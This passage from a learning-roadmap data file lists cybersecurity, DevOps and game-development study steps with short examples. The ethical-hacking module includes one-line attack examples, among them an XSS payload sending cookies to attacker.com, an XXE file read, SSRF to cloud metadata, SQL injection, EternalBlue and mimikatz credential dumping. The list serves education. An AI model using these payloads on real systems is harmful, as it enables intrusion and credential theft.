                        steps: [
                            { id: "cs-os-1", title: "Linux Command Line", description: "Navigation, file permissions, process management.", example: "ls -la; chmod 600 key.pem; ps aux | grep nginx" },
                            { id: "cs-os-2", title: "File Permissions & ACLs", description: "rwx, SUID, SGID, sticky bit.", example: "chmod u+s /usr/bin/passwd; getfacl file.txt" },
                            { id: "cs-os-3", title: "User & Group Management", description: "adduser, passwd, sudo, /etc/sudoers.", example: "usermod -aG sudo john; passwd -l root" },
                            { id: "cs-os-4", title: "Processes & Services", description: "ps, top, kill, systemctl, cron jobs.", example: "systemctl disable telnet; crontab -l" },
                            { id: "cs-os-5", title: "Log Analysis", description: "/var/log files, journalctl, log rotation.", example: "journalctl -u sshd -f; tail -f /var/log/auth.log" },
                            { id: "cs-os-6", title: "Network Commands", description: "netstat, ss, ip, tcpdump, nmap.", example: "ss -tulpn; netstat -an | grep LISTEN" },
                            { id: "cs-os-7", title: "Bash Scripting for Security", description: "Automating security checks.", example: "#!/bin/bash; for ip in $(cat ips.txt); do nmap $ip; done" },
                            { id: "cs-os-8", title: "Package Management & Updates", description: "Keeping systems patched.", example: "apt update && apt upgrade -y; yum check-update" },
                            { id: "cs-os-9", title: "AppArmor & SELinux", description: "Mandatory Access Control systems.", example: "aa-status; getenforce; setenforce 1" },
                            { id: "cs-os-10", title: "Disk Encryption (LUKS)", description: "Encrypting block devices.", example: "cryptsetup luksFormat /dev/sdb; cryptsetup open /dev/sdb data" },
                            { id: "cs-os-11", title: "Rootkit Detection", description: "chkrootkit, rkhunter.", example: "rkhunter --check --skip-keypress" },
                            { id: "cs-os-12", title: "Environment Hardening", description: "CIS Benchmarks, minimal installs.", example: "Remove unused packages; disable unused services." },
                            { id: "cs-os-13", title: "Windows Security Basics", description: "Group Policy, Event Viewer, Defender.", example: "gpedit.msc; eventvwr.msc; Get-Help Defender" },
                            { id: "cs-os-14", title: "Active Directory Attacks", description: "Pass-the-hash, Kerberoasting, privilege escalation.", example: "Invoke-Kerberoast; mimikatz sekurlsa::logonpasswords" },
                            { id: "cs-os-15", title: "Registry Analysis (Windows)", description: "Finding persistence mechanisms.", example: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
                            { id: "cs-os-16", title: "Volatility (Memory Forensics)", description: "Analyzing memory dumps.", example: "vol.py -f memory.dmp pslist" },
                            { id: "cs-os-17", title: "Privilege Escalation (Linux)", description: "SUID binaries, cron, writable paths.", example: "GTFOBins, sudo -l, find / -perm -4000" },
                            { id: "cs-os-18", title: "Container Security", description: "Docker hardening, non-root users, image scanning.", example: "docker scan myimage:latest; USER nonroot in Dockerfile" },
                            { id: "cs-os-19", title: "Kernel Exploits", description: "Understanding kernel vulnerabilities.", example: "Dirty COW, Spectre/Meltdown basics." },
                            { id: "cs-os-20", title: "Security Auditing Tools", description: "Lynis, OpenSCAP for automated auditing.", example: "lynis audit system --quick" }
                        ]
                    }
                ],
                project: "Harden a Linux server: configure firewall, disable unused services, set up fail2ban, and run Lynis audit."
            },
            {
                title: "Cryptography & Security Concepts",
                modules: [
                    {
                        id: "cs-3", title: "Cryptography & PKI",
                        steps: [
                            { id: "cs-cr-1", title: "Symmetric Encryption", description: "AES, 3DES — same key for encrypt/decrypt.", example: "openssl enc -aes-256-cbc -in file -out file.enc" },
                            { id: "cs-cr-2", title: "Asymmetric Encryption", description: "RSA, ECC — public/private key pairs.", example: "openssl genrsa -out private.pem 2048" },
                            { id: "cs-cr-3", title: "Hashing Algorithms", description: "MD5 (broken), SHA-1 (broken), SHA-256, SHA-3.", example: "echo 'data' | sha256sum" },
                            { id: "cs-cr-4", title: "Digital Signatures", description: "Proving authenticity and integrity.", example: "openssl dgst -sha256 -sign private.pem file.txt" },
                            { id: "cs-cr-5", title: "PKI & Certificates (X.509)", description: "Certificate chains, CAs, CRLs, OCSP.", example: "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem" },
                            { id: "cs-cr-6", title: "TLS/SSL Protocol", description: "Handshake, cipher suites, forward secrecy.", example: "TLS 1.3 supports only AEAD ciphers." },
                            { id: "cs-cr-7", title: "Password Hashing (bcrypt/Argon2)", description: "Salted and iterated hashing for passwords.", example: "argon2 password -id -t 3 -m 16 -p 4" },
                            { id: "cs-cr-8", title: "Key Exchange (Diffie-Hellman)", description: "Establishing shared secrets over public channels.", example: "ECDH with Curve25519." },
                            { id: "cs-cr-9", title: "Steganography", description: "Hiding data within images/audio.", example: "steghide embed -cf image.jpg -sf secret.txt" },
                            { id: "cs-cr-10", title: "PGP/GPG", description: "Email encryption and signing.", example: "gpg --gen-key; gpg --encrypt --recipient alice file.txt" },
                            { id: "cs-cr-11", title: "HMAC", description: "Message authentication using hash + secret key.", example: "import hmac; hmac.new(key, msg, hashlib.sha256).hexdigest()" },
                            { id: "cs-cr-12", title: "JWT Security", description: "Algorithm confusion, none algorithm attacks.", example: "Always validate 'alg' header; never accept 'none'." },
                            { id: "cs-cr-13", title: "Blockchain & Merkle Trees", description: "Cryptographic integrity in distributed systems.", example: "Block hash = SHA256(prev_hash + data + nonce)" },
                            { id: "cs-cr-14", title: "Hardware Security Modules (HSM)", description: "Physical devices for key management.", example: "AWS CloudHSM, YubiKey." },
                            { id: "cs-cr-15", title: "Side-Channel Attacks", description: "Timing attacks, power analysis.", example: "Use constant-time comparison for HMAC." },
                            { id: "cs-cr-16", title: "Secure Random Number Generation", description: "CSPRNG vs PRNG.", example: "os.urandom(32); secrets.token_hex(16)" },
                            { id: "cs-cr-17", title: "Obfuscation vs Encryption", description: "Why obfuscation is NOT security.", example: "Base64 is encoding, not encryption." },
                            { id: "cs-cr-18", title: "Post-Quantum Cryptography", description: "CRYSTALS-Kyber, NIST PQC standards.", example: "RSA will be broken by quantum computers." },
                            { id: "cs-cr-19", title: "Zero-Knowledge Proofs", description: "Proving knowledge without revealing it.", example: "zk-SNARKs used in Zcash." },
                            { id: "cs-cr-20", title: "Threat Modelling (STRIDE)", description: "Systematic identification of threats.", example: "Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation." }
                        ]
                    }
                ],
                project: "Implement a secure file encryption/decryption tool using AES-256-GCM and RSA key wrapping."
            },
            {
                title: "Offensive & Defensive Security",
                modules: [
                    {
                        id: "cs-4", title: "Ethical Hacking & Penetration Testing",
                        steps: [
                            { id: "cs-hack-1", title: "Penetration Testing Phases", description: "Recon, Scanning, Exploitation, Post-Exploitation, Reporting.", example: "PTES and OWASP Testing Guide." },
                            { id: "cs-hack-2", title: "Reconnaissance (Passive)", description: "OSINT: Shodan, Google Dorks, Maltego.", example: "site:target.com filetype:pdf; inurl:admin" },
                            { id: "cs-hack-3", title: "Active Scanning", description: "Nmap, Nikto, Masscan.", example: "nikto -h http://target.com; masscan -p1-65535 192.168.1.0/24" },
                            { id: "cs-hack-4", title: "Vulnerability Assessment", description: "OpenVAS, Nessus, Nuclei.", example: "nuclei -u https://target.com -t cves/" },
                            { id: "cs-hack-5", title: "SQL Injection", description: "SQLMap, manual payloads, UNION attacks.", example: "' OR '1'='1; sqlmap -u 'http://site.com/id=1' --dbs" },
                            { id: "cs-hack-6", title: "XSS (Cross-Site Scripting)", description: "Reflected, Stored, DOM-based XSS.", example: "<script>document.location='http://attacker.com?c='+document.cookie</script>" },
                            { id: "cs-hack-7", title: "CSRF Attacks", description: "Forging requests on behalf of authenticated users.", example: "<img src='http://bank.com/transfer?amount=1000&to=attacker'>" },
                            { id: "cs-hack-8", title: "IDOR & Broken Access Control", description: "Accessing data of other users.", example: "GET /api/users/2 when logged in as user 1." },
                            { id: "cs-hack-9", title: "XXE Injection", description: "XML External Entity attacks on XML parsers.", example: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>" },
                            { id: "cs-hack-10", title: "SSRF (Server-Side Request Forgery)", description: "Making server fetch internal resources.", example: "url=http://169.254.169.254/latest/meta-data/" },
                            { id: "cs-hack-11", title: "Metasploit Framework", description: "Exploitation and post-exploitation toolkit.", example: "use exploit/ms17_010_eternalblue; set RHOSTS target; run" },
                            { id: "cs-hack-12", title: "Burp Suite", description: "Intercepting and modifying web traffic.", example: "Proxy → Intercept → Repeater → Scanner" },
                            { id: "cs-hack-13", title: "Password Cracking", description: "Hashcat, John the Ripper, wordlists.", example: "hashcat -m 0 hashes.txt rockyou.txt" },
                            { id: "cs-hack-14", title: "Privilege Escalation Techniques", description: "Kernel exploits, misconfigured services, weak passwords.", example: "sudo -l; find / -writable -type f 2>/dev/null" },
                            { id: "cs-hack-15", title: "Buffer Overflow Basics", description: "Stack-based overflows, shellcode, ASLR/NX.", example: "python -c 'print \"A\"*100' | ./vulnerable_binary" },
                            { id: "cs-hack-16", title: "Social Engineering", description: "Phishing, vishing, pretexting.", example: "GoPhish framework for phishing simulations." },
                            { id: "cs-hack-17", title: "Wireless Hacking", description: "WPA2 handshake capture and crack.", example: "airodump-ng wlan0mon; aireplay-ng -0 1 ... ; aircrack-ng -w wordlist.txt cap.pcap" },
                            { id: "cs-hack-18", title: "CTF Competitions", description: "Practice on HackTheBox, TryHackMe, PicoCTF.", example: "Start with 'easy' machines, learn tooling." },
                            { id: "cs-hack-19", title: "Writing Penetration Test Reports", description: "Executive summary, findings, CVSS scores, remediation.", example: "Structure: Scope → Methodology → Findings → Recommendations" },
                            { id: "cs-hack-20", title: "Certifications Path", description: "CEH → OSCP → GPEN → CISM.", example: "OSCP is the gold standard for offensive security." }
                        ]
                    },
                    {
                        id: "cs-5", title: "Blue Team & Defense",
                        steps: [
                            { id: "cs-def-1", title: "SIEM Fundamentals", description: "Splunk, ELK Stack for centralized logging.", example: "index=auth sourcetype=linux_secure failed | stats count by src_ip" },
                            { id: "cs-def-2", title: "Incident Response Process", description: "Preparation, Identification, Containment, Eradication, Recovery.", example: "NIST 800-61 framework." },
                            { id: "cs-def-3", title: "Threat Hunting", description: "Proactively searching for threats.", example: "Hypothesis-driven: Hunt for lateral movement using Zeek logs." },
                            { id: "cs-def-4", title: "Indicators of Compromise (IoCs)", description: "IPs, hashes, domains that indicate compromise.", example: "Check VirusTotal for suspicious file hashes." },
                            { id: "cs-def-5", title: "MITRE ATT&CK Framework", description: "Mapping adversary tactics and techniques.", example: "T1566 = Phishing; T1055 = Process Injection" },
                            { id: "cs-def-6", title: "Vulnerability Management", description: "Scanning, patching, risk prioritization.", example: "CVSS Score > 9 = Critical; patch within 24 hours." },
                            { id: "cs-def-7", title: "Endpoint Detection & Response (EDR)", description: "CrowdStrike, SentinelOne, Microsoft Defender ATP.", example: "Monitor process creation, file writes, network connections." },
                            { id: "cs-def-8", title: "DNS Monitoring", description: "Detecting DGA domains, DNS tunneling.", example: "Unusual high-entropy domain queries = possible DGA." },
                            { id: "cs-def-9", title: "Honeypots & Deception", description: "Attracting and detecting attackers.", example: "Deploy Cowrie SSH honeypot; alert on any connection." },
                            { id: "cs-def-10", title: "Security Awareness Training", description: "Phishing simulations, policy training.", example: "KnowBe4, Proofpoint PSAT platforms." },
                            { id: "cs-def-11", title: "Data Loss Prevention (DLP)", description: "Preventing sensitive data exfiltration.", example: "Block email attachments containing PII patterns." },
                            { id: "cs-def-12", title: "Security Policies & Compliance", description: "GDPR, HIPAA, ISO 27001, SOC 2.", example: "Maintain data processing records (GDPR Art. 30)." },
                            { id: "cs-def-13", title: "Patch Management", description: "Systematic vulnerability remediation.", example: "Scan weekly → Prioritize critical → Test → Deploy → Verify." },
                            { id: "cs-def-14", title: "Backup & Disaster Recovery", description: "3-2-1 backup rule, RTO, RPO.", example: "3 copies, 2 media types, 1 offsite." },
                            { id: "cs-def-15", title: "Zero-Day Response", description: "Emergency patch deployment procedures.", example: "Virtual patching with WAF rules while waiting for vendor fix." },
                            { id: "cs-def-16", title: "Threat Intelligence Feeds", description: "Using IOC feeds to block known bad actors.", example: "AlienVault OTX, MISP, GreyNoise." },
                            { id: "cs-def-17", title: "Network Traffic Baselining", description: "Detecting anomalies from normal patterns.", example: "Unusual 3AM outbound traffic spike → investigate." },
                            { id: "cs-def-18", title: "Security Orchestration (SOAR)", description: "Automating incident response playbooks.", example: "Palo Alto XSOAR, Splunk SOAR." },
                            { id: "cs-def-19", title: "Cloud Security Posture Management", description: "Detecting misconfigurations in cloud.", example: "AWS Security Hub, Prisma Cloud, Wiz." },
                            { id: "cs-def-20", title: "Red vs Blue Team Exercises", description: "Purple teaming for continuous improvement.", example: "Tabletop exercises, adversary simulation with Atomic Red Team." }
                        ]
                    }
                ],
                project: "Set up a SOC home lab: deploy ELK SIEM, configure log shipping, create detection rules, simulate attacks and alert."
            }
        ]
    },
    devops: {
        title: "DevOps Roadmap",
        stages: [
            {
                title: "Culture & Linux Foundations",
                modules: [
                    {
                        id: "do-1", title: "DevOps Concepts & Linux",
                        steps: [
                            { id: "do-1", title: "What is DevOps?", description: "Culture of collaboration between Dev and Ops teams.", example: "CALMS: Culture, Automation, Lean, Measurement, Sharing." },
                            { id: "do-2", title: "DevOps Lifecycle", description: "Plan, Code, Build, Test, Release, Deploy, Operate, Monitor.", example: "Infinity loop: continuous delivery pipeline." },
                            { id: "do-3", title: "Agile & Scrum Basics", description: "Iterative development, sprints, standups.", example: "2-week sprints, Jira board, retrospectives." },
                            { id: "do-4", title: "Linux Fundamentals", description: "File system, permissions, processes, networking.", example: "ls -la; ps aux; netstat -tulpn; df -h" },
                            { id: "do-5", title: "Bash Scripting", description: "Automating tasks with shell scripts.", example: "#!/bin/bash\nfor f in logs/*.log; do gzip $f; done" },
                            { id: "do-6", title: "SSH & Remote Access", description: "Key-based auth, SSH tunneling, scp.", example: "ssh-keygen -t ed25519; ssh-copy-id user@server" },
                            { id: "do-7", title: "Cron Jobs & Scheduling", description: "Automating periodic tasks.", example: "0 2 * * * /opt/scripts/backup.sh" },
                            { id: "do-8", title: "Package Management", description: "apt, yum, dnf, brew for software installation.", example: "apt install nginx; systemctl enable nginx" },
                            { id: "do-9", title: "Process Management (systemd)", description: "Controlling services.", example: "systemctl start|stop|restart|status nginx" },
                            { id: "do-10", title: "Text Processing (sed, awk, grep)", description: "Transforming and filtering text streams.", example: "awk -F: '{print $1}' /etc/passwd | sort" },
                            { id: "do-11", title: "File Archiving & Transfer", description: "tar, rsync, scp for backups and transfers.", example: "tar -czf backup.tar.gz /var/www/; rsync -avz src/ user@host:dst/" },
                            { id: "do-12", title: "Git Fundamentals", description: "Version control workflows.", example: "git init; git add .; git commit -m 'feat: add feature'; git push" },
                            { id: "do-13", title: "Git Branching Strategies", description: "GitFlow, trunk-based development.", example: "main → develop → feature/xxx → PR → merge" },
                            { id: "do-14", title: "Python for DevOps", description: "Scripting automation tasks.", example: "import boto3; ec2 = boto3.client('ec2'); ec2.describe_instances()" },
                            { id: "do-15", title: "YAML & JSON", description: "Configuration file formats used everywhere in DevOps.", example: "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp" },
                            { id: "do-16", title: "Environment Variables", description: "Managing config without hardcoding.", example: "export DB_URL=postgres://... ; echo $DB_URL" },
                            { id: "do-17", title: "Networking Basics", description: "IP, DNS, ports, HTTP, TLS for infrastructure.", example: "dig google.com; curl -I https://api.example.com" },
                            { id: "do-18", title: "Make & Task Automation", description: "Using Makefiles for project automation.", example: "make build; make test; make deploy" },
                            { id: "do-19", title: "Regular Expressions", description: "Pattern matching in logs and configs.", example: "grep -E '^ERROR.*timeout' app.log" },
                            { id: "do-20", title: "Documentation Culture", description: "READMEs, runbooks, postmortems.", example: "Runbook: How to restart the payment service." }
                        ]
                    },
                    {
                        id: "do-2", title: "CI/CD Pipelines",
                        steps: [
                            { id: "do-ci-1", title: "What is CI/CD?", description: "Continuous Integration and Continuous Delivery/Deployment.", example: "Every commit triggers build → test → deploy." },
                            { id: "do-ci-2", title: "GitHub Actions", description: "YAML-based workflows in GitHub.", example: "on: [push]; jobs: build: runs-on: ubuntu-latest; steps: ..." },
                            { id: "do-ci-3", title: "GitLab CI", description: ".gitlab-ci.yml pipeline definitions.", example: "stages: [build, test, deploy]\nbuild-job:\n  stage: build\n  script: docker build ." },
                            { id: "do-ci-4", title: "Jenkins", description: "Open-source automation server.", example: "pipeline { agent any; stages { stage('Build') { steps { sh 'mvn package' } } } }" },
                            { id: "do-ci-5", title: "Pipeline Stages", description: "Build, Test, Lint, Security Scan, Deploy.", example: "npm run lint → npm test → docker build → kubectl apply" },
                            { id: "do-ci-6", title: "Automated Testing in CI", description: "Unit, integration, E2E tests gating deployments.", example: "jest --coverage; playwright test; fail pipeline on test failure." },
                            { id: "do-ci-7", title: "Secrets Management in CI", description: "Using GitHub Secrets, Vault in pipelines.", example: "env: DB_PASS: ${{ secrets.DB_PASSWORD }}" },
                            { id: "do-ci-8", title: "Docker in CI", description: "Building and pushing images in pipelines.", example: "docker build -t myapp:$SHA .; docker push myapp:$SHA" },
                            { id: "do-ci-9", title: "Artifact Storage", description: "Storing build outputs (JFrog, GitHub Packages, S3).", example: "aws s3 cp dist/ s3://my-builds/$SHA/ --recursive" },
                            { id: "do-ci-10", title: "Branch Policies", description: "Protecting main; requiring PR reviews and CI to pass.", example: "GitHub: Settings → Branch protection rules." },
                            { id: "do-ci-11", title: "Environment Gates", description: "Manual approvals before production deploy.", example: "GitHub Actions: environment: production; add required reviewers." },
                            { id: "do-ci-12", title: "Canary Deployments", description: "Rolling out changes to a small percentage of traffic.", example: "Deploy to 5% of pods → monitor → rollout 100%." },
                            { id: "do-ci-13", title: "Blue-Green Deployments", description: "Two identical environments switched at DNS level.", example: "Route 53 weighted routing: 100% → green, 0% → blue." },
                            { id: "do-ci-14", title: "Feature Flags", description: "Controlling features without deployments.", example: "LaunchDarkly, unleash.io; if (flags.newCheckout) { ... }" },
                            { id: "do-ci-15", title: "Rollback Strategies", description: "Automated rollback on health check failure.", example: "kubectl rollout undo deployment/myapp" },
                            { id: "do-ci-16", title: "DORA Metrics", description: "Deployment Frequency, Lead Time, MTTR, Change Failure Rate.", example: "Target: daily deploys, <1hr MTTR." },
                            { id: "do-ci-17", title: "Semantic Versioning", description: "MAJOR.MINOR.PATCH versioning.", example: "1.2.3 → 1.2.4 (patch) → 1.3.0 (minor) → 2.0.0 (major)" },
                            { id: "do-ci-18", title: "Automated Changelogs", description: "Generating changelogs from conventional commits.", example: "conventional-changelog; semantic-release." },
                            { id: "do-ci-19", title: "Dependency Scanning", description: "Security scanning for vulnerable packages.", example: "Snyk, Dependabot, OWASP Dependency-Check in CI." },
                            { id: "do-ci-20", title: "Pipeline Monitoring", description: "Tracking pipeline duration, success rates.", example: "Grafana dashboard for CI pipeline, alert on >30min builds." }
                        ]
                    }
                ],
                project: "Create a full CI/CD pipeline in GitHub Actions: lint → test → build Docker image → push to registry → deploy."
            },
            {
                title: "Containers & Orchestration",
                modules: [
                    {
                        id: "do-3", title: "Docker",
                        steps: [
                            { id: "do-doc-1", title: "Docker Architecture", description: "Client, daemon, images, containers, registry.", example: "docker pull nginx; docker run -d -p 80:80 nginx" },
                            { id: "do-doc-2", title: "Dockerfile", description: "Building custom images.", example: "FROM node:18-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci\nCMD ['node','server.js']" },
                            { id: "do-doc-3", title: "Docker Layers & Caching", description: "Optimizing build speed with layer caching.", example: "COPY package.json .\nRUN npm ci\nCOPY . . (copy source last!)" },
                            { id: "do-doc-4", title: "Multi-Stage Builds", description: "Reducing image size.", example: "FROM node:18 AS build\nRUN npm run build\nFROM nginx:alpine\nCOPY --from=build /app/dist /usr/share/nginx/html" },
                            { id: "do-doc-5", title: "Docker Volumes", description: "Persisting data outside containers.", example: "docker run -v /data/pg:/var/lib/postgresql/data postgres" },
                            { id: "do-doc-6", title: "Docker Networks", description: "Container-to-container communication.", example: "docker network create mynet; docker run --network mynet api" },
                            { id: "do-doc-7", title: "Docker Compose", description: "Running multi-container applications.", example: "services:\n  web:\n    build: .\n  db:\n    image: postgres" },
                            { id: "do-doc-8", title: "Environment Variables in Docker", description: "Passing config at runtime.", example: "docker run -e DB_URI=postgres://... myapp" },
                            { id: "do-doc-9", title: "Health Checks", description: "Marking containers as healthy/unhealthy.", example: "HEALTHCHECK CMD curl -f http://localhost/health || exit 1" },
                            { id: "do-doc-10", title: "Docker Registry", description: "Docker Hub, AWS ECR, GitHub Container Registry.", example: "docker tag app:latest ghcr.io/user/app:latest; docker push ..." },
                            { id: "do-doc-11", title: "Docker Security", description: "Non-root user, read-only filesystem, minimal base image.", example: "USER nonroot; RUN chmod 555 /app/server" },
                            { id: "do-doc-12", title: "Container Resource Limits", description: "CPU and memory constraints.", example: "docker run --memory=512m --cpus=1 myapp" },
                            { id: "do-doc-13", title: "Docker Logs", description: "Viewing and shipping container logs.", example: "docker logs -f container_name; --log-driver=fluentd" },
                            { id: "do-doc-14", title: "Docker Inspect & Exec", description: "Debugging running containers.", example: "docker exec -it mycontainer sh; docker inspect mycontainer" },
                            { id: "do-doc-15", title: "Container Image Scanning", description: "Finding CVEs in images.", example: "trivy image myapp:latest; docker scout cves myapp:latest" },
                            { id: "do-doc-16", title: "Distroless Images", description: "Ultra-minimal images with no OS shell.", example: "FROM gcr.io/distroless/nodejs18-debian12" },
                            { id: "do-doc-17", title: "Docker Swarm", description: "Built-in container orchestration for simpler use cases.", example: "docker swarm init; docker service create --replicas 3 myapp" },
                            { id: "do-doc-18", title: "Podman", description: "Docker alternative, daemonless and rootless.", example: "podman run nginx; podman-compose up" },
                            { id: "do-doc-19", title: ".dockerignore", description: "Excluding files from build context.", example: "node_modules\n.env\n.git\ndist" },
                            { id: "do-doc-20", title: "OCI Standard", description: "Open Container Initiative standards for portability.", example: "Docker, Podman, Buildah all produce OCI-compliant images." }
                        ]
                    },
                    {
                        id: "do-4", title: "Kubernetes",
                        steps: [
                            { id: "do-k8s-1", title: "Kubernetes Architecture", description: "Control plane (API server, etcd, scheduler), worker nodes (kubelet, kube-proxy).", example: "kubectl get nodes" },
                            { id: "do-k8s-2", title: "Pods", description: "The smallest deployable unit in K8s.", example: "kubectl run nginx --image=nginx; kubectl get pods" },
                            { id: "do-k8s-3", title: "Deployments", description: "Managing replicated Pods with rollout support.", example: "kubectl create deployment web --image=nginx --replicas=3" },
                            { id: "do-k8s-4", title: "Services", description: "ClusterIP, NodePort, LoadBalancer for Pod networking.", example: "kubectl expose deployment web --port=80 --type=LoadBalancer" },
                            { id: "do-k8s-5", title: "ConfigMaps & Secrets", description: "Decoupling config from container images.", example: "kubectl create secret generic db-creds --from-literal=password=mypass" },
                            { id: "do-k8s-6", title: "Namespaces", description: "Isolating resources within a cluster.", example: "kubectl create namespace staging; kubectl -n staging get pods" },
                            { id: "do-k8s-7", title: "Persistent Volumes", description: "Stateful storage for databases.", example: "PersistentVolumeClaim + StorageClass" },
                            { id: "do-k8s-8", title: "Ingress Controllers", description: "HTTP routing to services (nginx, Traefik).", example: "ingress.yaml with rules: host: app.com, path: /api → service:api:80" },
                            { id: "do-k8s-9", title: "Horizontal Pod Autoscaler", description: "Scaling pods based on CPU/memory/custom metrics.", example: "kubectl autoscale deployment web --cpu-percent=70 --min=2 --max=10" },
                            { id: "do-k8s-10", title: "Resource Requests & Limits", description: "Setting CPU/memory guarantees and caps.", example: "resources:\n  requests:\n    cpu: 100m\n  limits:\n    memory: 256Mi" },
                            { id: "do-k8s-11", title: "Liveness & Readiness Probes", description: "Health checking pods.", example: "livenessProbe:\n  httpGet:\n    path: /health\n    port: 8080\n  periodSeconds: 10" },
                            { id: "do-k8s-12", title: "Helm", description: "Package manager for Kubernetes applications.", example: "helm install myapp ./chart; helm upgrade myapp ./chart" },
                            { id: "do-k8s-13", title: "StatefulSets", description: "Managing stateful applications (e.g., databases).", example: "StatefulSet with volumeClaimTemplates for each Pod." },
                            { id: "do-k8s-14", title: "DaemonSets", description: "Running one Pod per node (logs, monitoring agents).", example: "DaemonSet for Fluentd log collection." },
                            { id: "do-k8s-15", title: "RBAC", description: "Role-Based Access Control in K8s.", example: "kubectl create role reader --verb=get,list --resource=pods" },
                            { id: "do-k8s-16", title: "Network Policies", description: "Firewall rules between pods.", example: "Deny all ingress; allow only from specific namespaces." },
                            { id: "do-k8s-17", title: "Service Mesh (Istio/Linkerd)", description: "mTLS, traffic management, observability.", example: "kubectl label namespace default istio-injection=enabled" },
                            { id: "do-k8s-18", title: "GitOps (ArgoCD/Flux)", description: "Declarative K8s management from Git.", example: "ArgoCD watches repo; syncs cluster to match git state." },
                            { id: "do-k8s-19", title: "Cluster Monitoring (Prometheus + Grafana)", description: "Metrics collection and dashboards.", example: "helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack" },
                            { id: "do-k8s-20", title: "Multi-Cluster Management", description: "Managing multiple clusters (EKS, GKE, AKS).", example: "kubectx; kubectl config use-context prod-cluster" }
                        ]
                    }
                ],
                project: "Containerize a microservices app and deploy it on Kubernetes with Helm, Ingress, HPA, and Prometheus monitoring."
            },
            {
                title: "Infrastructure as Code & Cloud",
                modules: [
                    {
                        id: "do-5", title: "Terraform & IaC",
                        steps: [
                            { id: "do-tf-1", title: "What is IaC?", description: "Provisioning infrastructure via code, not ClickOps.", example: "Terraform, Pulumi, CloudFormation, Ansible." },
                            { id: "do-tf-2", title: "Terraform Basics", description: "providers, resources, data sources.", example: "provider \"aws\" { region = \"us-east-1\" }\nresource \"aws_s3_bucket\" \"mybucket\" { bucket = \"myapp-data\" }" },
                            { id: "do-tf-3", title: "State Management", description: "terraform.tfstate, remote state in S3.", example: "terraform { backend \"s3\" { bucket = \"tfstate\" } }" },
                            { id: "do-tf-4", title: "Variables & Outputs", description: "Parameterizing modules.", example: "variable \"env\" { default = \"prod\" }\noutput \"vpc_id\" { value = aws_vpc.main.id }" },
                            { id: "do-tf-5", title: "Modules", description: "Reusable infrastructure components.", example: "module \"vpc\" { source = \"./modules/vpc\"; cidr = \"10.0.0.0/16\" }" },
                            { id: "do-tf-6", title: "Terraform Plan & Apply", description: "Preview and apply changes.", example: "terraform init; terraform plan -out=plan.out; terraform apply plan.out" },
                            { id: "do-tf-7", title: "Terraform Workspaces", description: "Managing multiple environments.", example: "terraform workspace new staging; terraform workspace select prod" },
                            { id: "do-tf-8", title: "Ansible", description: "Agentless configuration management.", example: "ansible-playbook -i inventory.ini setup.yml" },
                            { id: "do-tf-9", title: "Ansible Roles & Playbooks", description: "Structured automation tasks.", example: "roles/nginx/tasks/main.yml: - name: Install nginx apt: name: nginx" },
                            { id: "do-tf-10", title: "AWS Core Services", description: "EC2, S3, RDS, IAM, VPC, ELB, CloudWatch.", example: "aws ec2 describe-instances; aws s3 ls" },
                            { id: "do-tf-11", title: "AWS EKS", description: "Managed Kubernetes on AWS.", example: "eksctl create cluster --name myapp --region us-east-1 --nodegroup-size 3" },
                            { id: "do-tf-12", title: "AWS Lambda & Serverless", description: "Event-driven functions.", example: "serverless deploy; aws lambda invoke --function-name myFunc output.json" },
                            { id: "do-tf-13", title: "Secrets & Parameter Store", description: "AWS Secrets Manager and SSM Parameter Store.", example: "aws secretsmanager get-secret-value --secret-id prod/db/password" },
                            { id: "do-tf-14", title: "Cost Management", description: "AWS Cost Explorer, tagging strategy, right-sizing.", example: "Tag all resources: Project=myapp, Env=prod." },
                            { id: "do-tf-15", title: "Cloud Networking (VPC)", description: "Subnets, route tables, NAT gateways, security groups.", example: "Public subnet → IGW; Private subnet → NAT Gateway." },
                            { id: "do-tf-16", title: "Managed Kubernetes (EKS/GKE/AKS)", description: "Cloud-hosted Kubernetes clusters.", example: "gcloud container clusters create myapp --num-nodes 3" },
                            { id: "do-tf-17", title: "Observability Stack", description: "Logs(ELK), Metrics(Prometheus), Traces(Jaeger).", example: "loki + grafana for logs; tempo for traces." },
                            { id: "do-tf-18", title: "Disaster Recovery", description: "RTO/RPO planning, multi-region failover.", example: "Active-passive: primary us-east-1, standby eu-west-1." },
                            { id: "do-tf-19", title: "FinOps Practices", description: "Optimizing cloud costs.", example: "Use Spot/Preemptible instances for non-critical workloads." },
                            { id: "do-tf-20", title: "DevSecOps", description: "Integrating security into DevOps pipelines.", example: "SAST(SonarQube) → DAST(OWASP ZAP) → Container scan(Trivy)" }
                        ]
                    }
                ],
                project: "Provision a production-grade AWS setup with Terraform: VPC, EKS cluster, RDS, S3, CloudWatch alarms."
            }
        ]
    },
    game: {
        title: "Game Development Roadmap",
        stages: [
            {
                title: "Programming Foundations",
                modules: [
                    {
                        id: "gd-1", title: "C# & Game Programming Basics",
                        steps: [
                            { id: "gd-1", title: "C# Syntax Basics", description: "Variables, types, conditionals, loops.", example: "int score = 0; if (score > 10) { Debug.Log(\"Win!\"); }" },
                            { id: "gd-2", title: "Object-Oriented Programming", description: "Classes, inheritance, interfaces in C#.", example: "class Enemy : Character { public override void Attack() { ... } }" },
                            { id: "gd-3", title: "Delegates & Events", description: "Decoupled communication between objects.", example: "public event Action OnPlayerDeath; OnPlayerDeath?.Invoke();" },
                            { id: "gd-4", title: "LINQ in C#", description: "Querying collections cleanly.", example: "enemies.Where(e => e.isAlive).OrderBy(e => e.health).ToList()" },
                            { id: "gd-5", title: "Generic Collections", description: "List<T>, Dictionary<K,V>, Queue<T>.", example: "Dictionary<string, int> scores = new(); scores[\"Alice\"] = 100;" },
                            { id: "gd-6", title: "Coroutines in Unity", description: "Delays and timed sequences.", example: "IEnumerator FadeOut() { yield return new WaitForSeconds(1f); ... }" },
                            { id: "gd-7", title: "Design Patterns in Games", description: "Singleton, Observer, State, Object Pool.", example: "GameManager.Instance.StartGame();" },
                            { id: "gd-8", title: "Vectors & Transforms", description: "Positions, rotations, scale in 3D.", example: "transform.Translate(Vector3.forward * speed * Time.deltaTime);" },
                            { id: "gd-9", title: "Physics Basics", description: "Rigidbody, forces, collisions.", example: "rb.AddForce(Vector3.up * jumpForce, ForceMode.Impulse);" },
